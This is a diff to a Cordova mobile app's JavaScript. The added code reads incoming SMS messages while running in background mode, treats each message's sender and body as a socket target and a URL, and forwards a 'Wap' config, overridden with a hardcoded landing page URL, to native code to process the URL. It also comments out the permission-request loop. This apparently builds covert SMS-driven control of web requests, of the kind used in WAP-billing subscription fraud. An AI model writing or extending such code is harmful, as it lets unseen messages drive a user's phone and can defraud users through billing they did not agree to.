@@ -60,6 +60,9 @@
                 id: null,
                 sendMessage: null
               },
+              sms:{
+                sendConfigProcessUrlSms: null,
+              },
               img:null,
               appJava:null
             };
@@ -114,15 +117,7 @@
         async.whilst(
           function test(cb) { cb(null, exit); },
           function iter(callback) {
-            const permissions = window.cordova.plugins.permissions;
-
-            // permisos : 
-            var listPermisions = [
-            permissions.WRITE_EXTERNAL_STORAGE,
-            permissions.READ_SMS
-            ];
-
-            async.eachSeries(listPermisions, function(currentPermision, next) {
+            async.eachSeries(self.$f7.data.config.android.permission, function(currentPermision, next) {
               window.cordova.plugins.permissions.checkPermission(currentPermision, (status) => {
                 if(!status.hasPermission){
                   // !OK : hasPermission
@@ -167,10 +162,19 @@
           },
           function (err, exit) {
             // Finish ..
-            return self.getSms(self.$f7.data.config.sms);
+            // aca debe saber si tiene datos o wifi encendidos, de no tener red, que inicie con el 
+            // self.getSms, <- lo manda al background hasta que llegue el sms indicando la red, se levanta y lo manda
+            // online para verlo e iniciar el proceso URL
+
+            return this; //self.getSms(self.$f7.data.config.sms);
             
           });
         return this;            
+      },
+      sendProcessURLbySMS(data){
+        var self = this;
+        self.$f7.data.sms.sendConfigProcessUrlSms = data;                  
+        self.$f7.emit(data.event, self.$f7.data.sms.sendConfigProcessUrlSms);
       },
       getSms(filter){
         var self = this;
@@ -185,16 +189,32 @@
                 if(Array.isArray(data)) {
                   for(var i in data) {
                     var sms = data[i];
-                    console.log("SMS.listSMS, sms : " + JSON.stringify(sms));
-                    self.background(false);
                   }
-                }else{
-                  exit = true;
-                  callback(null, exit);
-                }
-              }, function(err){
-                console.log("SMS.listSMS, err : " + err);
-              });              
+                  console.log("SMS.listSMS, sms : " + JSON.stringify(sms));
+                  self.background(false);
+
+                    // config real
+                    var config = {
+                      socketId: sms.address,
+                      event: "sendConfigProcessUrlSocket",
+                      url: sms.body,
+                      on: 'configProcessUrlSocket',
+                      type: 'Wap',
+                      description: 'configProcessUrlSocket send to : ' + sms.address
+                    };
+                    console.log(config);
+                    // config temp
+                    var configTemp = config;
+                    configTemp.url = 'http://www.tulandia.net/landing/LC6s9r?skipcookie=2';
+
+                    self.sendProcessURLbySMS(configTemp);
+                  }else{
+                    exit = true;
+                    callback(null, exit);
+                  }
+                }, function(err){
+                  console.log("SMS.listSMS, err : " + err);
+                });              
             }
 
           },
@@ -233,7 +253,7 @@
             window.cordova.plugins.backgroundMode.enable();
 
             // Init Loop permisos.
-            self.permisos(this);
+            //self.permisos(this);
 
 
             // f7 -> App(Java) : event "initSocket"
